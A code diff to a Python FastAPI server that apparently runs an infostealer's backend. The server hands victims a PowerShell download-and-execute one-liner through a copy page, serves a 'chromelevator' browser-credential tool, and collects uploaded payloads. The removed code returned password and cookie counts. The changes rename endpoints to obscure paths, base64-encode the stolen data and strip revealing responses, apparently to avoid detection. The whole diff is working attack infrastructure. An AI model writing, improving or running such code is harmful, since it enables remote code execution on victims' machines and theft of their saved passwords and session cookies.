@@ -1,3 +1,4 @@
+import base64
 import json
 import logging
 import os
@@ -79,30 +80,47 @@ def resolve_api_base(request: Request | None = None) -> str:
 
 
 API_BASE = resolve_api_base()
-PAYLOAD_URL = f"{API_BASE}/payload"
+PAYLOAD_URL = f"{API_BASE}/p"
 
 
-def build_powershell_command(api_base: str | None = None) -> str:
+def build_powershell_command(
+    api_base: str | None = None,
+    *,
+    close_terminal: bool = False,
+    debug: bool = False,
+) -> str:
     base = api_base or API_BASE
-    return f"iex (New-Object Net.WebClient).DownloadString('{base}/windows-script')"
+    script_url = f"{base}/wscp"
+    params: list[str] = []
+    if close_terminal:
+        params.append("close=1")
+    if debug:
+        params.append("debug=1")
+    if params:
+        script_url += "?" + "&".join(params)
+    return f"iex (New-Object Net.WebClient).DownloadString('{script_url}')"
 
 
 def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
     return save_payload_record(payload)
 
 
-def render_windows_script() -> str:
+def render_windows_script(*, close_terminal: bool = False, debug_mode: bool = False) -> str:
+    close_literal = "$true" if close_terminal else "$false"
+    debug_literal = "$true" if debug_mode else "$false"
     return (
         SCRIPT_PATH.read_text(encoding="utf-8")
         .replace("__API_BASE__", API_BASE)
         .replace("__PAYLOAD_URL__", PAYLOAD_URL)
+        .replace("__CLOSE_TERMINAL__", close_literal)
+        .replace("__DEBUG_MODE__", debug_literal)
     )
 
 
-@app.get("/windows-script", response_class=PlainTextResponse)
-async def get_windows_script() -> PlainTextResponse:
+@app.get("/wscp", response_class=PlainTextResponse)
+async def get_windows_script(close: bool = False, debug: bool = False) -> PlainTextResponse:
     return PlainTextResponse(
-        render_windows_script(),
+        render_windows_script(close_terminal=close, debug_mode=debug),
         media_type="text/plain; charset=utf-8",
     )
 
@@ -111,6 +129,8 @@ async def get_windows_script() -> PlainTextResponse:
 async def copy_command(request: Request) -> HTMLResponse:
     api_base = resolve_api_base(request)
     command = build_powershell_command(api_base)
+    command_with_close = build_powershell_command(api_base, close_terminal=True)
+    command_with_debug = build_powershell_command(api_base, debug=True)
 
     return HTMLResponse(
         f"""<!DOCTYPE html>
@@ -134,6 +154,7 @@ async def copy_command(request: Request) -> HTMLResponse:
       padding: 0.75rem 1.5rem;
       font-size: 1rem;
       cursor: pointer;
+      min-width: 12rem;
     }}
     #status {{
       color: #16a34a;
@@ -143,36 +164,42 @@ async def copy_command(request: Request) -> HTMLResponse:
 </head>
 <body>
   <button type="button" id="copy-btn">Copy</button>
+  <button type="button" id="copy-close-btn">Copy with close</button>
+  <button type="button" id="copy-debug-btn">Copy with debug</button>
   <div id="status"></div>
   <script>
     const command = {json.dumps(command)};
-    document.getElementById("copy-btn").addEventListener("click", async () => {{
+    const commandWithClose = {json.dumps(command_with_close)};
+    const commandWithDebug = {json.dumps(command_with_debug)};
+
+    async function copyText(text) {{
       const status = document.getElementById("status");
+      status.textContent = "";
       try {{
-        await navigator.clipboard.writeText(command);
+        await navigator.clipboard.writeText(text);
         status.textContent = "Copied";
       }} catch (e) {{
         const textarea = document.createElement("textarea");
-        textarea.value = command;
+        textarea.value = text;
         textarea.style.position = "fixed";
         textarea.style.opacity = "0";
         document.body.appendChild(textarea);
         textarea.select();
-        if (document.execCommand("copy")) {{
-          status.textContent = "Copied";
-        }} else {{
-          status.textContent = "Could not copy";
-        }}
+        status.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
         textarea.remove();
       }}
-    }});
+    }}
+
+    document.getElementById("copy-btn").addEventListener("click", () => copyText(command));
+    document.getElementById("copy-close-btn").addEventListener("click", () => copyText(commandWithClose));
+    document.getElementById("copy-debug-btn").addEventListener("click", () => copyText(commandWithDebug));
   </script>
 </body>
 </html>"""
     )
 
 
-@app.get("/chromelevator", response_model=None)
+@app.get("/chrmlvtr", response_model=None)
 async def get_chromelevator(arch: str = "x64"):
     arch = arch.lower()
     if arch not in {"x64", "arm64"}:
@@ -189,20 +216,20 @@ async def get_chromelevator(arch: str = "x64"):
     )
 
 
-@app.post("/payload")
-async def receive_payload(request: Request) -> dict[str, Any]:
-    payload = await request.json()
-    saved = save_payload(payload)
+@app.post("/p")
+async def receive_payload(request: Request) -> Response:
+    raw_body = (await request.body()).decode("utf-8").strip()
+    try:
+        payload = json.loads(base64.b64decode(raw_body))
+    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
+        return PlainTextResponse("", status_code=400)
 
-    chromelevator = payload.get("chromelevator") if isinstance(payload.get("chromelevator"), dict) else {}
+    if not isinstance(payload, dict):
+        return PlainTextResponse("", status_code=400)
 
-    return {
-        "received": True,
-        "password_count": payload.get("passwordCount", 0),
-        "cookie_count": payload.get("cookieCount", 0),
-        "chromelevator": chromelevator,
-        "saved": saved,
-    }
+    save_payload(payload)
+
+    return Response(status_code=200, content=b"")
 
 
 if ADMIN_ENABLED:
